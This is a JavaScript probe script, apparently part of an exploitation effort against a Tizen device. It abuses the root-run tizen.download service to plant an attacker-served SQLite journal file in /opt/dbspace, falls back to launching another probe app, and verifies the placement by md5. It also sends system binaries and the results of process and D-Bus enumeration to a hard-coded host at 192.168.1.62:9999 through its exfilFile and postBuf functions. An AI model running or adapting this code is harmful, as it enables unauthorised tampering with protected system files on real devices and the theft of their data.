"use strict";

/* p60: J1 journal placement via tizen.download (root download-provider)
   A. tizen availability check + D1 network/API test + J1 download to /opt/dbspace
   B. fallback if not placed: was_execute ProbeAppio.Probe7 (p71 auto J1) + wait 60s
   C. verify dst md5 before/after; dotnet hang check (p59 leftover)
   D. exfil wasutility + RunningAppsService; busctl list
   exfil /p60info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var JRN_URL = 'http://192.168.1.62:9999/.app-context.db-journal';
var TEST_URL = 'http://192.168.1.62:9999/serve_test.txt';
var JRN_NAME = '.app-context.db-journal';
var R = { ts: new Date().toISOString(), probe: 'p60', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p60info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function exfilFile(path, postPath) {
  try {
    var buf = fs.readFileSync(path);
    postBuf(postPath, buf);
    R.results['exfil_' + postPath] = 'posted ' + buf.length + ' bytes';
  } catch (e) {
    R.results['exfil_' + postPath] = 'read err: ' + e.message;
  }
}

function tizenAvail() {
  try {
    return (typeof tizen !== 'undefined') && !!tizen.download && !!tizen.download.start && !!tizen.DownloadRequest;
  } catch (e) { return false; }
}

function tizenDl(url, dest, fileName, label, cb) {
  R.results['dl_' + label + '_start'] = new Date().toISOString() + ' url=' + url + ' dest=' + (dest || 'default') + ' fileName=' + (fileName || null);
  var events = [];
  var finished = false;
  var id = null, req = null, started = false;
  function finishOnce(res) {
    if (finished) return;
    finished = true;
    var st = '';
    try { st = String(tizen.download.getState(id)); } catch (e) { st = 'getState-err:' + e; }
    R.results['dl_' + label] = 'res=' + res + ' state=' + st + ' started=' + started + ' id=' + id + ' events=[' + events.join(';') + ']';
    cb(res);
  }
  var opts = {
    downloadCallback: {
      onprogress: function () { events.push('progress'); },
      oncompleted: function () { events.push('completed'); setTimeout(function () { finishOnce('COMPLETED'); }, 2500); },
      onfailed: function () { events.push('failed'); finishOnce('FAILED'); }
    }
  };
  if (dest !== null) opts.dest = dest;
  if (fileName !== null) opts.fileName = fileName;
  try { req = new tizen.DownloadRequest(url, opts); }
  catch (e) { R.results['dl_' + label] = 'ctor ' + e; cb('ctor:' + e); return; }
  try { id = tizen.download.start(req); started = true; }
  catch (e) { R.results['dl_' + label] = 'start-throw ' + e; cb('start:' + e); return; }
  var t0 = Date.now();
  var iv = setInterval(function () {
    if (finished) { clearInterval(iv); return; }
    var st = '';
    try { st = String(tizen.download.getState(id)); } catch (e) { st = 'getState-err:' + e; }
    if (st.indexOf('COMPLETED') >= 0 || st.indexOf('FAILED') >= 0 || st.indexOf('ABORTED') >= 0) {
      clearInterval(iv);
      setTimeout(function () { finishOnce(st); }, 1500);
      return;
    }
    if (Date.now() - t0 > 90000) {
      clearInterval(iv);
      finishOnce('timeout state=' + st);
    }
  }, 2000);
}

function main() {
  R.results.tizen_check = 'tizen_available=' + tizenAvail();
  R.results.before = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1; ls -la /opt/dbspace/.app-context.db-journal 2>&1; md5sum /opt/dbspace/.app-context.db 2>&1', 15000);

  function finish() {
    R.results.dotnet_ps = run('for d in /proc/[0-9]*; do if grep -qa "dotnet-launcher" $d/cmdline 2>/dev/null; then echo "PID=${d#/proc/}"; grep -E "Name|State|Uid|CapBnd" $d/status 2>/dev/null; echo "wchan: $(cat $d/wchan 2>/dev/null)"; echo ---; fi; done 2>&1 | head -80', 20000);
    exfilFile('/usr/bin/wasutility', '/p60was');
    exfilFile('/usr/bin/RunningAppsService', '/p60ras');
    R.results.busctl = run('busctl --system list 2>&1 | head -50', 20000);
    R.results.final = 'done ' + new Date().toISOString();
    L('done ' + new Date().toISOString());
    postFinal();
    setTimeout(postFinal, 20000);
  }

  function afterDl(d1res) {
    setTimeout(function () {
      R.results.after_dl = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1; ls -la /opt/dbspace/.app-context.db-journal 2>&1', 15000);
      var placed = false;
      try { placed = R.results.after_dl.indexOf('03683f81d337ce2224df6010456738e9') >= 0; } catch (e) {}
      if (placed) {
        R.results.placement = 'PLACED via tizen.download (D1=' + d1res + ')';
        finish();
        return;
      }
      R.results.was_execute = run('which was_execute 2>&1; was_execute ProbeAppio.Probe7 2>&1; echo was_exit=$?', 20000);
      R.results.waiting_probe7 = 'waiting 60s for Probe7 p71 J1 (D1 was: ' + d1res + ')';
      setTimeout(function () {
        R.results.after_was = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1; ls -la /opt/dbspace/.app-context.db-journal /opt/dbspace/p71d6.txt 2>&1', 15000);
        finish();
      }, 60000);
    }, 8000);
  }

  if (tizenAvail()) {
    tizenDl(TEST_URL, null, 'p60d1.txt', 'D1', function (res) {
      R.results.d1_result = res;
      if (res === 'COMPLETED') {
        tizenDl(JRN_URL, '/opt/dbspace', JRN_NAME, 'J1', function (res2) {
          R.results.j1_result = res2;
          afterDl(res);
        });
      } else {
        afterDl(res);
      }
    });
  } else {
    R.results.j1_result = 'skipped: tizen not available';
    afterDl('no_tizen');
  }
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
